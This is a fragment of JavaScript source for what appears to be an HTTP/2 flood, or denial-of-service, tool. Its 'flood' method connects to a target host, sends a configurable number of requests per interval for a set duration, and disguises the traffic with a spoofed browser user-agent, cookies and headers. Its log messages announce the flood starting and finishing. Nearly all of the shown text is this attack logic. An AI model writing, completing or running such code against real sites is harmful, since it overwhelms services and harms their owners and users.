...
class brs {
    ...
    async flood(host, duration, rates, userAgent, cookies, headersbro) {
        ...
        const client = http2.connect(`${url.protocol}//${url.hostname}`);
        ...
        const sendRequest = () => {
            return new Promise((resolve, reject) => {
                const req = client.request({
                    ...
                    'user-agent': userAgent,
                    'accept': headersbro['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    ...
                    'pragma': 'no-cache',
                    'connection': 'keep-alive',
                    // Nếu headersbro có trường nào cần thêm thì thêm ở đây
                });
        ...
        const requestInterval = setInterval(() => {
            if (Date.now() >= endTime) {
                ...
                client.close();
                console.log('[INFO] HTTP/2 Flood finished');
                return;
            }
            for (let i = 0; i < rates; i++) {
                sendRequest().catch(e => console.error('[ERROR] HTTP/2 request:', e));
            }
        }, intervalMs);

        console.log(`[INFO] HTTP/2 Flood started on ${rates} rates for ${duration} seconds`);
    }
